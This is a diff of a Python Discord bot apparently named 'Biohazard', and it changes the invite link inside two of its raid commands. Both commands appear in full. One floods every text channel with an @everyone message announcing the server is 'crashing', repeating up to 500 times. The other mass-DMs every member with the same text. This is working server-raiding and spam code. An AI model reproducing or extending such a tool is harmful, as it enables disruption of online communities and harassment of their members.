@@ -183,7 +183,7 @@ class MyClient(discord.Client):
 					pass
 				
 			if message.content == '*флуд': #флуд
-				spam = '@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8'
+				spam = '@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/APTCAAF'
 				await message.delete()
 				while s <= 500:
 					for channel in message.guild.text_channels:
@@ -311,7 +311,7 @@ class MyClient(discord.Client):
 			if message.content == '*лс':
 				await message.delete()
 				for i in message.guild.members:
-					await i.send('Внимание, сервер {0.guild.name} крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8'.format(message))
+					await i.send('Внимание, сервер {0.guild.name} крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/APTCAAF'.format(message))
 					
 			if message.content == '*лаги': #лаги
 				await message.delete()
